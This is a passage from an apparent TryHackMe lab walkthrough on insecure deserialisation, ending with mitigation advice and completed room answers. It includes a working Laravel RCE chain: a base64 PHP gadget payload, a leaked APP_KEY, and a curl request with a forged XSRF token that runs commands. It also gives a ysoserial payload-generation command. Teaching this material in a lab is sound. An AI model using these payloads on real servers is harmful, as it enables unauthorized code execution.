Now that we have the `APP_KEY` and payload, it's time to create an encrypted CSRF token. For the sake of this room, we have prepared a PHP script that would take APP_KEY and payload as arguments and return the encrypted token. You can access the link at [http://MACHINE_IP:8089/cve.php?app_key=xx&payload=xxx](http://machine_ip:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D). For your convenience, this URL already has the URL encoded key and first payload with the **whoami**  command. Understanding the encryption mechanism for a framework like Laravel and WordPress is a simple task, but currently, it's out of the scope of the room.

When pen-testing web frameworks like Yii, CakePHP, and Laravel, it's essential to understand that each framework has unique routing and encryption mechanisms despite all being built on PHP. These frameworks are designed with different architectures and security implementations, which means a vulnerability like RCE3 in Laravel, specifically exploiting Laravel's service container and serialisation behaviour, would not necessarily apply to WordPress or other PHP-based systems. WordPress, for instance, has a different structure and does not use Laravel's specific classes or methods, so an exploit tailored for Laravel's architecture won't directly work on WordPress.

Now that we have the encrypted token, we can make a simple POST request using the CSRF token as shown below to execute the command. The payload result will appear at the start of the `cURL` response.

    Terminal  
```Terminal 
thm@machine$curl MACHINE_IP:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0
<!DOCTYPE html><!--
100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k
curl: (23) Failed writing body (947 != 7240)
```

 

 Ysoserial for Java

Ysoserial is a widely recognised exploitation tool specifically crafted to test the security of Java applications against serialisation vulnerabilities. It helps generate payloads that exploit these vulnerabilities, making it an essential tool for attackers and penetration testers who aim to assess and exploit applications that use Java serialisation. 

To use Ysoserial, an attacker would typically generate a payload with a command such as `java -jar ysoserial.jar [payload type] '[command to execute]'`, where `[payload type]` is the type of exploit and `[command to execute]` is the arbitrary command they wish to run on the target system. For example, using the `CommonsCollections1` payload type might look like this: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. This command generates a serialised object that will execute the specified command when deserialised by a vulnerable application. Ysoserial is available for [download ](https://github.com/frohoff/ysoserial)on GitHub.

### **Answer the questions below**

**Question:** What is the vector for exploiting CodeIgniter4/FR1 as per the PHPGGC?

*Answer:* 

     __toString

**Question:** What is the output of the whoami command on the vulnerable Laravel application?

*Answer:* 

     root

**Question:** What is the output of the uname -r command on the vulnerable Laravel application?

*Answer:* 

     5.15.0-1075-aws

---

## Task 8 | Mitigation Measures

Mitigating the risks associated with insecure deserialisation is paramount in ensuring the security of a web application. By implementing effective defence measures, organisations can significantly reduce the likelihood of exploitation and mitigate 

 potential damage. We will discuss this from the perspective of the red team/pentester and the secure code. 
Red Teamer / Pentester Perspective

- **Codebase analysis** : Conduct a comprehensive review of the application's serialisation mechanisms. Identify potential points of deserialisation and serialisation throughout the codebase.
- **Vulnerability identification** : Use static analysis tools to detect insecure deserialisation vulnerabilities. Look for improper input validation, insecure libraries, and outdated dependencies.
- **Fuzzing and dynamic analysis** : Employ fuzzing techniques to generate invalid or unexpected input data. Use dynamic analysis tools to monitor the application's behaviour during runtime.
- **Error handling assessment** : Evaluate how the application handles errors during deserialisation. Look for potential error messages or stack traces that reveal system details.

Secure Coder Perspective

- **Avoid insecure serialisation formats** : Avoid using inherently insecure serialisation formats like Java serialisation. Choose safer alternatives such as JSON or XML with robust validation mechanisms.
- **Avoid eval and exec** : Avoid using `eval()` and `exec()` functions, as they can execute arbitrary code and pose a significant security risk.
- **Input validation and output encoding** : Implement stringent input validation to ensure that only expected data is accepted. Apply output encoding techniques to sanitise data before serialisation.
- **Secure coding practices** : Follow secure coding practices recommended by security standards and guidelines. Adopt principles such as least privilege, defence in depth, and fail-safe defaults.
- **Adherence to guidelines** : Established secure coding guidelines specific to the programming language or framework.

### **Answer the questions below**

**Question:** Is it a good practice to blindly use the eval() function in your code? (yea/nay)

*Answer:* 

     nay

---

## Task 9 | Conclusion

In conclusion, the room on insecure serialisation has provided a thorough understanding of this critical security vulnerability and its impact on web applications. We started by exploring the fundamental concepts of serialisation and insecure serialisation. We then delved into various serialisation formats used in different programming languages to understand the diverse manifestations of this vulnerability.

Next, we learned how to identify insecure serialisation vulnerabilities within applications. Through practical exercises, we explored exploitation techniques, including updating properties and object injection, to comprehend the multifaceted nature of attacks leading to remote code execution.

Finally, we discussed mitigation measures to secure applications against these vulnerabilities and reviewed automation scripts to streamline the identification and remediation process. This room has equipped you with the knowledge to identify, exploit, and mitigate insecure serialisation vulnerabilities, strengthening your overall security posture.

Let us know your thoughts on this room on our [Discord ](https://discord.com/invite/tryhackme)channel or [X account](https://twitter.com/RealTryHackMe). See you around.

### **Answer the questions below**

**Question:** I have successfully completed the room.

*Answer:* 

     No answer needed

---
